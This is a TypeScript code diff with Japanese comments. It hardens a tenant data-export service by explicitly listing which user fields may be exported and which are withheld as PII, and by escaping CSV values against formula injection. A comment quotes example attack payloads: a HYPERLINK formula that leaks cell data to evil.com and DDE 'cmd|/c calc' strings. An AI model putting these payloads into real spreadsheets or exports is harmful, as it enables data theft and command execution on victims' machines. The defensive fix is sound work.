@@ -314,21 +314,57 @@ export async function exportTenantData(tenantId: string): Promise<DataExportResu
  *                permanentLock / mfaEnabled / mfaFailedCount / mfaLockedUntil
  *     (これらは内部運用情報で顧客にとって不要 + 漏洩リスク)
  *   - 内部フラグ: forcePasswordChange
+ *
+ * 2026-05-13 (security/data-export-pii-ci-guard, L-6): User schema の列追加を
+ *   検知する CI ガードのため、出力対象 / 除外対象を **定数として明示**。
+ *   data-export.service.test.ts で `USER_EXPORT_FIELDS ∪ USER_PII_FIELDS` が
+ *   `Prisma.UserScalarFieldEnum` の全列と一致することを assert する。
+ *   新フィールド追加で意図せず PII が漏れる事故を防ぐ。
  */
+export const USER_EXPORT_FIELDS = [
+  'id',
+  'tenantId',
+  'name',
+  'email',
+  'systemRole',
+  'isActive',
+  'themePreference',
+  'lastLoginAt',
+  'createdAt',
+  'updatedAt',
+] as const;
+
+/**
+ * User の絶対に出力してはいけない PII / 内部運用フィールド一覧。
+ * USER_EXPORT_FIELDS と重複しないこと (CI が同時 assert する)。
+ */
+export const USER_PII_FIELDS = [
+  'passwordHash',
+  'mfaSecretEncrypted',
+  'failedLoginCount',
+  'lockedUntil',
+  'temporaryLockCount',
+  'permanentLock',
+  'mfaEnabled',
+  'mfaEnabledAt',
+  'mfaFailedCount',
+  'mfaLockedUntil',
+  'forcePasswordChange',
+  'deletedAt',
+  // 2026-05-13 (PR #350 security/jwt-invalidation, L-1): JWT 失効カウンタは内部認証情報。
+  //   admin 操作で increment され既存 JWT を即時失効させるための実装詳細であり、
+  //   顧客データ持ち出しの export 対象には含めない。
+  'tokenVersion',
+] as const;
+
 function stripUserPII(user: Record<string, unknown>): Record<string, unknown> {
   // PR-1 (2026-05-15): timezone / locale はテナント単位に集約されたため User からは除外。
   //   テナント metadata セクション (= tenant.timezone / tenant.locale) で出力される。
-  return {
-    id: user.id,
-    name: user.name,
-    email: user.email,
-    systemRole: user.systemRole,
-    isActive: user.isActive,
-    themePreference: user.themePreference,
-    lastLoginAt: user.lastLoginAt,
-    createdAt: user.createdAt,
-    updatedAt: user.updatedAt,
-  };
+  const result: Record<string, unknown> = {};
+  for (const key of USER_EXPORT_FIELDS) {
+    result[key] = user[key];
+  }
+  return result;
 }
 
 // ================================================================
@@ -350,13 +386,31 @@ function jsonReplacer(_key: string, value: unknown): unknown {
 // 内部: CSV ビルダー
 // ================================================================
 
-/** RFC 4180 互換の CSV エスケープ */
-function csvEscape(value: unknown): string {
+/**
+ * RFC 4180 互換の CSV エスケープ + Formula Injection 対策 (CWE-1236)。
+ *
+ * 2026-05-13 (security/csv-formula-injection, B-4):
+ *   Excel/Google Sheets が `=`/`+`/`-`/`@`/`\t`/`\r` で始まる値を **数式評価** するため、
+ *   悪意ユーザが `displayName = '=HYPERLINK("https://evil.com/?"&A1, "click")'` のような
+ *   ペイロードを CSV エクスポートに混入させると、admin/super がファイルを開いた瞬間に
+ *   外部 URL を踏まされて資格情報が抜かれる攻撃が成立する (CSV Injection)。
+ *   対象文字で始まる値は `'` (シングルクォート) を前置し、Excel に文字列として
+ *   解釈させる (OWASP 推奨手法)。
+ *
+ *   攻撃ペイロード例:
+ *     =cmd|'/c calc'!A1
+ *     @SUM(1+1)*cmd|'/c calc'!A1
+ *     -2+3+cmd|'/c calc'!A1
+ *     \tDDE("cmd", ...)  ← タブ始まり
+ */
+export function csvEscape(value: unknown): string {
   if (value == null) return '';
   let s: string;
   if (value instanceof Date) s = value.toISOString();
   else if (typeof value === 'object') s = JSON.stringify(value);
   else s = String(value);
+  // B-4: Formula Injection 対策。数式メタ文字で始まる値は `'` で文字列化を強制。
+  if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
   if (/[",\r\n]/.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
   }
